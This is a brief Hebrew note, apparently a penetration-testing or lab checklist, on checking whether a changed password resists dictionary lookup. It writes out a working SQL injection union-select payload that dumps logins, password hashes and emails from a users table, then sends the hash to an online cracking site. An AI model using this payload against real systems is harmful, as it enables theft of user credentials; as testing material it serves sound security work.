
בדיקת סיסמא לא מהמילון

1.	משנים את הסיסמא למשהו לא מהמילון 
2.	עושים SQLI 
' union select 1,group_concat(login,0x3a,password,0x3a,email,0x0a),3,4,5,6,7 from users
3 . מכניסים את ה hash ל crackstation  ובודקים אם קיים.
https://crackstation.net/
